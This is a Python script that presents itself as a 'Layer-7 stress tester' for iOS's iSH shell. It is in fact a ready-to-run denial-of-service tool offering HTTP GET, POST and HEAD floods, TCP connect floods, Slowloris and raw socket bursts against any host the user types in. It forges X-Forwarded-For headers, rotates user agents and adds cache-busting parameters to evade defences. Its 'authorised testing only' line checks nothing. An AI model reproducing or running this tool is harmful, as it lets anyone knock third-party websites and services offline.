#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
# ##  VOID Stress — iSH / iOS Edition
# ##  Layer-7 stress tester  ·  no raw sockets needed
# ##  @lfw.k4rma_
# ##  FOR AUTHORISED TESTING OF YOUR OWN INFRASTRUCTURE ONLY
# ══════════════════════════════════════════════════════════════════
#
# Install on iSH:
#   apk add python3 py3-pip
#   pip3 install rich requests --break-system-packages
#   python3 void_stress_ish.py
#
# Or let the script auto-install deps on first run.

import subprocess, sys, os

# ── auto-install deps ──────────────────────────────────────────
def _ensure(mod, pkg):
    try:
        __import__(mod)
        return
    except ImportError:
        pass
    print(f"[*] Installing {pkg}...")
    cmds = [
        [sys.executable, "-m", "pip", "install", pkg, "-q"],
        ["pip3", "install", pkg, "-q"],
        ["pip",  "install", pkg, "-q"],
    ]
    for cmd in cmds:
        try:
            subprocess.check_call(cmd,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return
        except Exception:
            continue
    print(f"[!] Could not install {pkg}.")
    print(f"    Fix:  apk add py3-pip && pip3 install {pkg}")
    print(f"    Or just run:  sh ddos.sh")
    sys.exit(1)

_ensure("rich",     "rich")
_ensure("requests", "requests")

import socket, threading, time, random, string, re
import requests
from urllib.parse  import urlparse
from rich.console  import Console
from rich.rule     import Rule
from rich.text     import Text
from rich.table    import Table
from rich.live     import Live
from rich.align    import Align
from rich.panel    import Panel
from rich          import box

console    = Console()
stop_event = threading.Event()

# ══════════════════════════════════════════════════════════════════
# STATS
# ══════════════════════════════════════════════════════════════════

import errno as _errno

class Stats:
    def __init__(self):
        self._lock    = threading.Lock()
        self.sent     = 0
        self.success  = 0
        self.n_refused = 0   # ECONNREFUSED — packet reached server (flood working)
        self.n_timeout = 0   # timeout      — dropped / overwhelmed
        self.n_error   = 0   # other
        self.bytes    = 0
        self._t0      = time.time()

    def ok(self, nbytes: int = 0):
        with self._lock:
            self.sent     += 1
            self.success  += 1
            self.bytes    += nbytes

    def add_exc(self, exc: Exception):
        code = getattr(exc, "errno", None)
        with self._lock:
            self.sent += 1
            if code in (_errno.ECONNREFUSED, _errno.ECONNRESET):
                self.n_refused += 1
            elif isinstance(exc, (TimeoutError, socket.timeout, OSError)) and \
                 code in (_errno.ETIMEDOUT, None):
                self.n_timeout += 1
            else:
                self.n_error += 1

    def snap(self):
        with self._lock:
            elapsed = max(time.time() - self._t0, 0.001)
            return {
                "sent":     self.sent,
                "success":  self.success,
                "refused":  self.n_refused,
                "timeout":  self.n_timeout,
                "errors":   self.n_error,
                "bytes":    self.bytes,
                "elapsed":  elapsed,
                "pps":      self.sent / elapsed,
                "bps":      self.bytes / elapsed,
            }

# ══════════════════════════════════════════════════════════════════
# USER-AGENTS & PATHS
# ══════════════════════════════════════════════════════════════════

_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
    "curl/8.6.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Dalvik/2.1.0 (Linux; U; Android 14)",
]

_PATHS = [
    "/", "/index.html", "/index.php", "/home", "/api", "/search",
    "/login", "/admin", "/wp-login.php", "/robots.txt",
    "/sitemap.xml", "/favicon.ico", "/api/v1/status", "/health",
    "/static/main.js", "/assets/style.css",
]

_REFERERS = [
    "https://google.com/", "https://bing.com/", "https://duckduckgo.com/",
    "https://twitter.com/", "https://reddit.com/", "https://t.co/",
]

def _rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _headers(host: str) -> dict:
    return {
        "Host":            host,
        "User-Agent":      random.choice(_AGENTS),
        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Referer":         random.choice(_REFERERS),
        "Cache-Control":   "no-cache",
        "Pragma":          "no-cache",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
        "X-Real-IP":       f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
    }

# ══════════════════════════════════════════════════════════════════
# FLOOD WORKERS
# ══════════════════════════════════════════════════════════════════

def _worker_http_get(target: str, port: int, host: str, stats: Stats):
    """Mode 1 — HTTP GET flood"""
    url_base = f"{'https' if port == 443 else 'http'}://{target}:{port}"
    while not stop_event.is_set():
        try:
            path   = random.choice(_PATHS)
            buster = f"?v={_rand_str()}&t={int(time.time())}"
            r = requests.get(
                f"{url_base}{path}{buster}", headers=_headers(host),
                timeout=4, allow_redirects=False, stream=False)
            stats.ok(len(r.content))
        except Exception as e:
            stats.add_exc(e)

def _worker_http_post(target: str, port: int, host: str, stats: Stats):
    """Mode 2 — HTTP POST flood with random body"""
    url_base = f"{'https' if port == 443 else 'http'}://{target}:{port}"
    while not stop_event.is_set():
        try:
            path = random.choice(_PATHS)
            body = {_rand_str(): _rand_str(16) for _ in range(8)}
            r = requests.post(
                f"{url_base}{path}", headers=_headers(host),
                data=body, timeout=4, allow_redirects=False)
            stats.ok(len(r.content))
        except Exception as e:
            stats.add_exc(e)

def _worker_tcp_connect(target: str, port: int, stats: Stats):
    """Mode 3 — TCP connection flood (no raw sockets)"""
    while not stop_event.is_set():
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.sendall(b"GET / HTTP/1.1\r\n")
            time.sleep(random.uniform(0.1, 0.4))
            stats.ok(18)
        except Exception as e:
            stats.add_exc(e)
        finally:
            if s:
                try: s.close()
                except Exception: pass

def _worker_slowloris(target: str, port: int, host: str, stats: Stats):
    """Mode 4 — Slowloris: hold connections open with partial headers"""
    sockets = []
    while not stop_event.is_set():
        while len(sockets) < 50 and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.sendall((
                    f"GET /?{_rand_str()} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(_AGENTS)}\r\n"
                    f"Accept-language: en-US,en;q=0.9\r\n"
                ).encode())
                sockets.append(s)
                stats.ok()
            except Exception:
                stats.err()

        dead = []
        for s in sockets:
            try:
                s.sendall(f"X-Keep: {_rand_str()}\r\n".encode())
                stats.ok(20)
            except Exception as e:
                dead.append(s)
                stats.add_exc(e)

        for s in dead:
            try: s.close()
            except Exception: pass
            sockets.remove(s)

        time.sleep(10)

    for s in sockets:
        try: s.close()
        except Exception: pass

def _worker_http_head(target: str, port: int, host: str, stats: Stats):
    """Mode 5 — HTTP HEAD flood (ultra-lightweight, max req/s)"""
    url_base = f"{'https' if port == 443 else 'http'}://{target}:{port}"
    sess = requests.Session()
    while not stop_event.is_set():
        try:
            path = random.choice(_PATHS)
            r = sess.head(
                f"{url_base}{path}?{_rand_str()}",
                headers=_headers(host), timeout=3,
                allow_redirects=False)
            stats.ok(len(str(r.headers)))
        except Exception as e:
            stats.add_exc(e)
            sess = requests.Session()

def _worker_raw_tcp(target: str, port: int, host: str, stats: Stats):
    """Mode 6 — Hand-crafted HTTP over raw socket (bypasses requests overhead)"""
    while not stop_event.is_set():
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            path    = random.choice(_PATHS)
            payload = (
                f"GET {path}?{_rand_str()} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            s.sendall(payload)
            resp = s.recv(512)
            stats.ok(len(resp))
        except Exception as e:
            stats.add_exc(e)
        finally:
            if s:
                try: s.close()
                except Exception: pass

# ══════════════════════════════════════════════════════════════════
# MODES TABLE
# ══════════════════════════════════════════════════════════════════

MODES = {
    "1": {
        "label":      "HTTP GET Flood",
        "color":      "bright_red",
        "desc":       "Spam randomised GET requests — hammers web server & app layer",
        "worker":     _worker_http_get,
        "needs_host": True,
    },
    "2": {
        "label":      "HTTP POST Flood",
        "color":      "bright_cyan",
        "desc":       "POST random form data — burns CPU on server-side processing",
        "worker":     _worker_http_post,
        "needs_host": True,
    },
    "3": {
        "label":      "TCP Connect Flood",
        "color":      "bright_yellow",
        "desc":       "Rapid TCP connects — exhausts server connection pool",
        "worker":     _worker_tcp_connect,
        "needs_host": False,
    },
    "4": {
        "label":      "Slowloris",
        "color":      "bright_magenta",
        "desc":       "Hold connections open forever — starves thread-per-conn servers",
        "worker":     _worker_slowloris,
        "needs_host": True,
    },
    "5": {
        "label":      "HTTP HEAD Flood",
        "color":      "bright_green",
        "desc":       "Ultra-fast HEAD requests — max req/s with minimal bandwidth",
        "worker":     _worker_http_head,
        "needs_host": True,
    },
    "6": {
        "label":      "Raw TCP Burst",
        "color":      "orange1",
        "desc":       "Hand-crafted HTTP over raw socket — bypasses requests lib overhead",
        "worker":     _worker_raw_tcp,
        "needs_host": True,
    },
}

# ══════════════════════════════════════════════════════════════════
# BANNER & UI
# ══════════════════════════════════════════════════════════════════

def show_banner():
    console.clear()
    console.print()
    console.print(Rule(style="bright_red"))
    console.print()
    for line in [
        "██╗   ██╗ ██████╗ ██╗██████╗     ██╗███████╗██╗  ██╗",
        "██║   ██║██╔═══██╗██║██╔══██╗    ██║██╔════╝██║  ██║",
        "██║   ██║██║   ██║██║██║  ██║    ██║███████╗███████║",
        "╚██╗ ██╔╝██║   ██║██║██║  ██║    ██║╚════██║██╔══██║",
        " ╚████╔╝ ╚██████╔╝██║██████╔╝    ██║███████║██║  ██║",
        "  ╚═══╝   ╚═════╝ ╚═╝╚═════╝     ╚═╝╚══════╝╚═╝  ╚═╝",
    ]:
        console.print(Align.center(f"[bold bright_red]{line}[/]"))
    console.print()
    console.print(Align.center("[dim]i S H  ·  i O S  E d i t i o n  ·  L a y e r - 7  S t r e s s[/]"))
    console.print(Align.center("[dim red]@lfw.k4rma_   ·   for authorised testing only[/]"))
    console.print()
    console.print(Rule(style="bright_red"))
    console.print()

def show_mode_menu():
    console.print(Rule("[dim red]  SELECT MODE  [/]", style="dim red"))
    console.print()
    for num, m in MODES.items():
        console.print(f"  [bright_red]\\[{num}][/]  [bold {m['color']}]{m['label']}[/]")
        console.print(f"       [dim]{m['desc']}[/]")
        console.print()

def _bar(ratio: float, width: int = 24, col: str = "bright_red") -> Text:
    ratio  = max(0.0, min(ratio, 1.0))
    filled = int(ratio * width)
    b = Text()
    b.append("█" * filled,            style=col)
    b.append("░" * (width - filled),  style="dim")
    return b

def _fmt_bytes(b: float) -> str:
    if b < 1024:     return f"{b:.0f} B/s"
    if b < 1024**2:  return f"{b/1024:.1f} KB/s"
    return                   f"{b/1024**2:.2f} MB/s"

def _make_panel(snap: dict, label: str, col: str) -> Panel:
    t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
    t.add_column(style="dim",        no_wrap=True)
    t.add_column(style="bold white", no_wrap=True)
    t.add_column(no_wrap=True)

    sent     = snap["sent"]
    ok       = snap["success"]
    refused  = snap["refused"]
    timeout  = snap["timeout"]
    err      = snap["errors"]
    pps      = snap["pps"]
    bps      = snap["bps"]

    ok_r  = ok      / max(sent, 1)
    ref_r = refused / max(sent, 1)
    to_r  = timeout / max(sent, 1)

    t.add_row("Mode",     f"[bold {col}]{label}[/]",                 "")
    t.add_row("Elapsed",  f"{snap['elapsed']:.0f}s",                 "")
    t.add_row("Sent",     f"{sent:,}",                               "")
    t.add_row("Success",  f"[green]{ok:,}[/]",
              _bar(ok_r,  16, "green"))
    # Refused = packet reached server (flood is working)
    t.add_row("Refused",  f"[yellow]{refused:,}[/]  [dim](hit server)[/]",
              _bar(ref_r, 16, "yellow"))
    t.add_row("Timeout",  f"[red]{timeout:,}[/]  [dim](dropped)[/]",
              _bar(to_r,  16, "red"))
    if err:
        t.add_row("Other err", f"[dim red]{err:,}[/]",              "")
    t.add_row("Req/s",    f"[bright_red]{pps:,.1f}[/]",
              _bar(min(pps / 500, 1.0), 16, col))
    t.add_row("Bandwidth",f"[cyan]{_fmt_bytes(bps)}[/]",             "")
    return Panel(t, title=f"[bold {col}]VOID STRESS — iSH[/]",
                 border_style=col, padding=(0, 1))

# ══════════════════════════════════════════════════════════════════
# RESOLVE
# ══════════════════════════════════════════════════════════════════

def resolve(target: str) -> str:
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        return target
    try:
        ip = socket.gethostbyname(target)
        console.print(f"  [dim]Resolved:[/]  [bold yellow]{target}[/] → [white]{ip}[/]")
        return ip
    except Exception:
        console.print(f"  [red]✘  Could not resolve[/] [bold]{target}[/]")
        sys.exit(1)

# ══════════════════════════════════════════════════════════════════
# RUN
# ══════════════════════════════════════════════════════════════════

def run(target_ip: str, target_host: str, port: int, mode: dict, n_threads: int):
    stop_event.clear()
    stats  = Stats()
    label  = mode["label"]
    col    = mode["color"]
    worker = mode["worker"]

    threads = []
    for _ in range(n_threads):
        args = (target_ip, port, target_host, stats) if mode["needs_host"] \
               else (target_ip, port, stats)
        t = threading.Thread(target=worker, args=args, daemon=True)
        t.start()
        threads.append(t)

    console.print()
    console.print(Rule(f"[bold {col}]  {label}  [/]", style=col))
    console.print(f"  [dim]Target  [/]  [bold white]{target_host}[/]  [dim]({target_ip}:{port})[/]")
    console.print(f"  [dim]Threads [/]  [bold white]{n_threads}[/]")
    console.print(Rule(style=col))
    console.print()
    console.print("  [dim]Ctrl+C to stop[/]")
    console.print()

    try:
        with Live(console=console, refresh_per_second=4, screen=False) as live:
            while True:
                live.update(_make_panel(stats.snap(), label, col))
                time.sleep(0.25)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()

    # ── summary ───────────────────────────────────────────────────
    snap = stats.snap()

    console.print()
    console.print(Rule(style="bright_red"))
    console.print(Align.center("[bold white]SESSION SUMMARY[/]"))
    console.print(Rule(style="bright_red"))
    console.print()

    ref_pct = snap["refused"] / max(snap["sent"], 1) * 100
    to_pct  = snap["timeout"] / max(snap["sent"], 1) * 100

    tbl = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
    tbl.add_column(style="dim",        no_wrap=True)
    tbl.add_column(style="bold white", no_wrap=True)
    tbl.add_row("Target",        f"{target_host} ({target_ip}:{port})")
    tbl.add_row("Mode",          f"[bold {col}]{label}[/]")
    tbl.add_row("Duration",      f"{snap['elapsed']:.1f}s")
    tbl.add_row("Total Sent",    f"{snap['sent']:,}")
    tbl.add_row("Success",       f"[green]{snap['success']:,}[/]")
    tbl.add_row("Refused",       f"[yellow]{snap['refused']:,} ({ref_pct:.1f}%)[/]  [dim]← hit server[/]")
    tbl.add_row("Timeout",       f"[red]{snap['timeout']:,} ({to_pct:.1f}%)[/]  [dim]← dropped[/]")
    tbl.add_row("Avg Req/s",     f"[bright_red]{snap['pps']:,.1f}[/]")
    tbl.add_row("Avg Bandwidth", f"[cyan]{_fmt_bytes(snap['bps'])}[/]")
    tbl.add_row("Total Data",    f"[cyan]{snap['bytes']/1024:.1f} KB[/]")
    console.print(Align.center(tbl))
    console.print()
    console.print(Rule(style="bright_red"))
    console.print()

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    show_banner()

    console.print("  [bright_red]◈[/]  [bold white]Target IP / hostname:[/]  ", end="")
    raw_target = input().strip()
    if not raw_target:
        console.print("  [red]✘  No target entered.[/]"); sys.exit(1)

    console.print("  [bright_red]◈[/]  [bold white]Port (default 80):[/]  ", end="")
    raw_port = input().strip()
    try:
        port = int(raw_port) if raw_port else 80
    except ValueError:
        console.print("  [red]✘  Invalid port.[/]"); sys.exit(1)

    console.print()
    target_host = raw_target
    target_ip   = resolve(raw_target)

    console.print()
    show_mode_menu()
    console.print("  [bright_red]◈[/]  [bold white]Mode (1–6, default 1):[/]  ", end="")
    mode = MODES.get(input().strip(), MODES["1"])

    console.print("  [bright_red]◈[/]  [bold white]Threads (default 16, max 64):[/]  ", end="")
    try:
        n_threads = int(input().strip() or "16")
        n_threads = max(1, min(n_threads, 64))
    except ValueError:
        n_threads = 16

    run(target_ip, target_host, port, mode, n_threads)

if __name__ == "__main__":
    main()
